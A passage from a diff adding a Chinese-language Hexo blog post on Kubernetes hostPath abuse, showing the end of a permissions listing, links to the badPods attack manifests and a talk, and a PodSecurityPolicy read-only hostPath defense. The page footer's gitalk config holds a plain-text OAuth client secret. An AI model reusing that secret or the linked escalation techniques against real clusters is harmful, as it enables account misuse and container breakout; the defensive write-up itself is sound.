update]</span><br><span class="line">selfsubjectaccessreviews.authorization.k8s.io   []                                    []                      [create]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>其他方法还有，这个视频演示了其中的两种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.youtube.com/watch?v=HmoVSmTIOxM</span><br></pre></td></tr></table></figure>
+
+<p>这个repo列了系统的一些可以利用的敏感数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BishopFox/badPods/tree/main/manifests/hostpath</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>防御的方法是在psp中添加约束：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems</span><br><span class="line"></span><br><span class="line">allowedHostPaths:</span><br><span class="line">- pathPrefix: &quot;/foo&quot;</span><br><span class="line">  readOnly: true # only allow read-only mounts</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems">Volumes and file systems</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HmoVSmTIOxM">The Path Less Traveled: Abusing Kubernetes Defaults</a><br><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">hostPath</a><br><a target="_blank" rel="noopener" href="https://github.com/BishopFox/badPods/tree/main/manifests/hostpath">Bad Pod #4: Unrestricted hostPath</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div></div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/payimage/wechat.png" alt="yizhiren 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/payimage/zhifubao.png" alt="yizhiren 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/kubernetes/" rel="tag"># kubernetes</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/07/podsecuritypolicy/" rel="prev" title="k8s中的PodSecurityPolicy">
+                  <i class="fa fa-chevron-left"></i> k8s中的PodSecurityPolicy
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/02/09/cksknowledge/" rel="next" title="k8s安全知识即CKS考试知识点总结">
+                  k8s安全知识即CKS考试知识点总结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yizhiren</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"yizhiren","repo":"yizhiren.github.io","client_id":"f06437e321af81a44e6e","client_secret":"fc63095ff123d820c599d51aaf2030b542bf8854","admin_user":"yizhiren","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"76387294144f44f993b2f4214e95a3d7"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
